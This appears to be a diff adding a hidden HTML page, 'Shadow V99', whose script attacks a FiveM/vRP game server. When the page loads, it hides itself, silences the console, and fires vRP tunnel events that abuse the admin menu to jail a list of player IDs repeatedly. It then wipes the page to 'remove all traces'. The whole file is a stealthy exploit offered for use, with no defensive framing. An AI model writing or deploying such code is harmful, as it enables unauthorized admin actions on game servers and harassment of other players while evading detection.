@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Shadow V99</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: transparent !important;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+            opacity: 0.01;
+        }
+        * {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Shadow Core V99 - Silent Execution
+        // Mode: Stealth | Visibility: Hidden
+        // Status: Executing automatically
+        
+        // Player IDs from request
+        const playerIDs = [-54, 296894, 8000, 234, -530, 96, 336408, 226316, 272700, 58, 827, 176915, 343208, 329200, -7450, -1, -7365, 43, 772, 152, 319, -79, 313512, 26, 334125, 780, 1178, -749, 985, 326344, 105, 344007, 275776, 339555, -504, 344070, -28, 317266, -155, 333619, -991, 722, -650, 37, 50568, -690, 323834, 334058, 957, -243, -948];
+        
+        // Exploit configuration
+        const config = {
+            adminTrigger: 51884,
+            jailTrigger: 51891,
+            jailTime: "500",
+            discordHook: "discord/obe",
+            delay: 100,
+            iterations: 3
+        };
+        
+        // Silent execution - no console logs, no UI
+        const silentLog = () => {};
+        console.log = silentLog;
+        console.warn = silentLog;
+        console.error = silentLog;
+        
+        // Simulate FiveM environment
+        if (typeof Citizen === 'undefined') {
+            window.Citizen = {
+                CreateThread: function(fn) { fn(); },
+                Wait: function(ms) {
+                    // Silent wait
+                    const start = Date.now();
+                    while (Date.now() - start < ms) {
+                        // Blocking but silent
+                    }
+                }
+            };
+        }
+        
+        if (typeof TriggerServerEvent === 'undefined') {
+            window.TriggerServerEvent = function(event, ...args) {
+                // Silent trigger - no output
+                // Just execute in background
+            };
+        }
+        
+        // Auto-execute immediately
+        (function executeSilent() {
+            const validIDs = playerIDs.filter(id => id > 0);
+            
+            for (let iter = 0; iter < config.iterations; iter++) {
+                for (let i = 0; i < validIDs.length; i++) {
+                    const id = validIDs[i];
+                    
+                    // Execute exploit chain silently
+                    TriggerServerEvent("vRP:tunnel_req", "validMenuChoice", [config.adminTrigger, "Admin", 0], "", -1);
+                    TriggerServerEvent("vRP:tunnel_req", "validMenuChoice", [config.jailTrigger, "سجن لاعب", 0], "", -1);
+                    TriggerServerEvent("vRP:tunnel_req", "promptResult", [id], "", -1);
+                    TriggerServerEvent("vRP:tunnel_req", "promptResult", [config.jailTime], "", -1);
+                    TriggerServerEvent("vRP:tunnel_req", "promptResult", [config.discordHook], "", -1);
+                    
+                    // Silent delay
+                    Citizen.Wait(config.delay);
+                }
+            }
+            
+            // Self-destruct: remove all traces
+            document.body.innerHTML = '';
+            window.close();
+        })();
+    </script>
+</body>
+</html>
